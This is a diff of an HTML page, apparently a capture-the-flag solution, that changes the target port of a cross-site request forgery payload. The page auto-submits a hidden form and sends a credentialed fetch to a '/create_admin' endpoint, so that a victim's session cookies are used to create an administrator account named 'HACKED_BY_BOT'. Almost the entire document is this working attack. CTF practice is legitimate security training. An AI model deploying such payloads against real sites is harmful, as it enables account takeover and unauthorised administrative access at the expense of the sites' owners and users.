@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<form method="POST" action="https://tasks.goidactf.ru:20395/create_admin" target="_blank">
+<form method="POST" action="https://tasks.goidactf.ru:20499/create_admin" target="_blank">
     <input type="hidden" name="new_admin_login" value="HACKED_BY_BOT">
 </form>
 <script>
@@ -8,7 +8,7 @@ document.forms[0].submit();
 
 // Пробуем также через fetch с credentials
 setTimeout(() => {
-    fetch('https://tasks.goidactf.ru:20395/create_admin', {
+    fetch('https://tasks.goidactf.ru:20499/create_admin', {
         method: 'POST',
         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
         credentials: 'include', // Отправляет куки сессии
